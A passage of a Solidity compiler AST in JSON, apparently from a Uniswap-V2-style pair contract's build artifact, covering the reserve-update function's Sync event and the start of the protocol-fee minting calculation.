																"overloadedDeclarations": [],
																"referencedDeclaration": 1180,
																"src": "4035:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 1265,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "4027:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint112_$",
																"typeString": "type(uint112)"
															},
															"typeName": "uint112"
														},
														"id": 1267,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "4027:17:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "4016:28:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1269,
												"nodeType": "ExpressionStatement",
												"src": "4016:28:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1274,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1270,
														"name": "reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 976,
														"src": "4054:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1272,
																"name": "balance1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1182,
																"src": "4073:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 1271,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "4065:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint112_$",
																"typeString": "type(uint112)"
															},
															"typeName": "uint112"
														},
														"id": 1273,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "4065:17:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "4054:28:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1275,
												"nodeType": "ExpressionStatement",
												"src": "4054:28:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1278,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1276,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 978,
														"src": "4092:18:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1277,
														"name": "blockTimestamp",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1207,
														"src": "4113:14:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "4092:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"id": 1279,
												"nodeType": "ExpressionStatement",
												"src": "4092:35:6"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1281,
															"name": "reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 974,
															"src": "4147:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1282,
															"name": "reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 976,
															"src": "4157:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1280,
														"name": "Sync",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1134
														],
														"referencedDeclaration": 1134,
														"src": "4142:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint112,uint112)"
														}
													},
													"id": 1283,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4142:24:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1284,
												"nodeType": "EmitStatement",
												"src": "4137:29:6"
											}
										]
									},
									"documentation": null,
									"id": 1286,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_update",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1187,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1180,
												"name": "balance0",
												"nodeType": "VariableDeclaration",
												"scope": 1286,
												"src": "3216:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1179,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "3216:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1182,
												"name": "balance1",
												"nodeType": "VariableDeclaration",
												"scope": 1286,
												"src": "3239:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1181,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "3239:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1184,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1286,
												"src": "3262:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1183,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "3262:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1186,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1286,
												"src": "3289:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1185,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "3289:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3206:106:6"
									},
									"returnParameters": {
										"id": 1188,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3321:0:6"
									},
									"scope": 2224,
									"src": "3190:983:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1397,
										"nodeType": "Block",
										"src": "4366:786:6",
										"statements": [
											{
												"assignments": [
													1296
												],
												"declarations": [
													{
														"constant": false,
														"id": 1296,
														"name": "feeTo",
														"nodeType": "VariableDeclaration",
														"scope": 1397,
														"src": "4376:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1295,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "4376:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1302,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1298,
																	"name": "factory",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 966,
																	"src": "4401:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1297,
																"name": "IFactory",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 601,
																"src": "4392:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IFactory_$601_$",
																	"typeString": "type(contract IFactory)"
																}
															},
															"id": 1299,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4392:17:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IFactory_$601",
																"typeString": "contract IFactory"
															}
														},
														"id": 1300,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "feeTo",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 550,
														"src": "4392:23:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
															"typeString": "function () view external returns (address)"
														}
													},
													"id": 1301,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4392:25:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4376:41:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1309,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1303,
														"name": "feeOn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1293,
														"src": "4427:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"id": 1308,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1304,
															"name": "feeTo",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1296,
															"src": "4435:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1306,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4452:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 1305,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "4444:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1307,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4444:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"src": "4435:19:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "4427:27:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1310,
												"nodeType": "ExpressionStatement",
												"src": "4427:27:6"
											},
											{
												"assignments": [
													1312
												],
												"declarations": [
													{
														"constant": false,
														"id": 1312,
														"name": "_kLast",
														"nodeType": "VariableDeclaration",
														"scope": 1397,
														"src": "4464:11:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1311,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4464:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1314,
												"initialValue": {
													"argumentTypes": null,
													"id": 1313,
													"name": "kLast",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 984,
													"src": "4478:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4464:19:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1315,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1293,
													"src": "4512:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1389,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1387,
															"name": "_kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1312,
															"src": "5099:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1388,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5109:1:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "5099:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1395,
													"nodeType": "IfStatement",
													"src": "5095:51:6",
													"trueBody": {
														"id": 1394,
														"nodeType": "Block",
														"src": "5112:34:6",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 1392,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 1390,
																		"name": "kLast",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 984,
																		"src": "5126:5:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 1391,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5134:1:6",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
																	"src": "5126:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1393,
																"nodeType": "ExpressionStatement",
																"src": "5126:9:6"
															}
														]
													}
												},
												"id": 1396,
												"nodeType": "IfStatement",
												"src": "4508:638:6",
												"trueBody": {
													"id": 1386,
													"nodeType": "Block",
													"src": "4519:570:6",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1318,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1316,
																	"name": "_kLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1312,
																	"src": "4537:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1317,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4547:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4537:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 1385,
															"nodeType": "IfStatement",
															"src": "4533:546:6",
															"trueBody": {
																"id": 1384,
																"nodeType": "Block",
																"src": "4550:529:6",
																"statements": [
																	{
																		"assignments": [
																			1320
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1320,
																				"name": "rootK",
																				"nodeType": "VariableDeclaration",
																				"scope": 1384,
																				"src": "4568:10:6",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1319,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "4568:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1330,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1327,
																							"name": "_reserve1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1290,
																							"src": "4611:9:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint112",
																								"typeString": "uint112"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint112",
																								"typeString": "uint112"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 1324,
																									"name": "_reserve0",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1288,
																									"src": "4596:9:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint112",
																										"typeString": "uint112"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_uint112",
																										"typeString": "uint112"
																									}
																								],
																								"id": 1323,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "4591:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint256_$",
																									"typeString": "type(uint256)"
																								},
																								"typeName": "uint"
																							},
																							"id": 1325,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "4591:15:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1326,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2298,
																						"src": "4591:19:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1328,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "4591:30:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1321,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "4581:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1322,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "4581:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1329,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4581:41:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "4568:54:6"
																	},
																	{
																		"assignments": [
																			1332
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1332,
																				"name": "rootKLast",
																				"nodeType": "VariableDeclaration",
																				"scope": 1384,
																				"src": "4640:14:6",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1331,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "4640:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1337,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1335,
																					"name": "_kLast",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1312,
																					"src": "4667:6:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1333,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "4657:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1334,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "4657:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1336,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4657:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "4640:34:6"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1340,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1338,
																				"name": "rootK",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1320,
																				"src": "4696:5:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1339,
																				"name": "rootKLast",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1332,
																				"src": "4704:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "4696:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 1383,
																		"nodeType": "IfStatement",
																		"src": "4692:373:6",
																		"trueBody": {
																			"id": 1382,
																			"nodeType": "Block",
																			"src": "4715:350:6",
																			"statements": [
																				{
																					"assignments": [
																						1342
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1342,
																							"name": "numerator",
																							"nodeType": "VariableDeclaration",
																							"scope": 1382,
																							"src": "4737:14:6",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 1341,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4737:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1353,
																					"initialValue": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"hexValue": "38",
																								"id": 1351,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "4821:1:6",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_8_by_1",
																									"typeString": "int_const 8"
																								},
																								"value": "8"
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_rational_8_by_1",
																									"typeString": "int_const 8"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"arguments": [
																											{
																												"argumentTypes": null,
																												"id": 1347,
																												"name": "rootKLast",
																												"nodeType": "Identifier",
																												"overloadedDeclarations": [],
																												"referencedDeclaration": 1332,
																												"src": "4780:9:6",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"expression": {
																											"argumentTypes": [
																												{
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											],
																											"expression": {
																												"argumentTypes": null,
																												"id": 1345,
																												"name": "rootK",
																												"nodeType": "Identifier",
																												"overloadedDeclarations": [],
																												"referencedDeclaration": 1320,
																												"src": "4770:5:6",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"id": 1346,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"memberName": "sub",
																											"nodeType": "MemberAccess",
																											"referencedDeclaration": 2270,
																											"src": "4770:9:6",
																											"typeDescriptions": {
																												"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																												"typeString": "function (uint256,uint256) pure returns (uint256)"
																											}
																										},
																										"id": 1348,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"kind": "functionCall",
																										"lValueRequested": false,
																										"names": [],
																										"nodeType": "FunctionCall",
																										"src": "4770:20:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 1343,
																										"name": "totalSupply",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 19,
																										"src": "4754:11:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
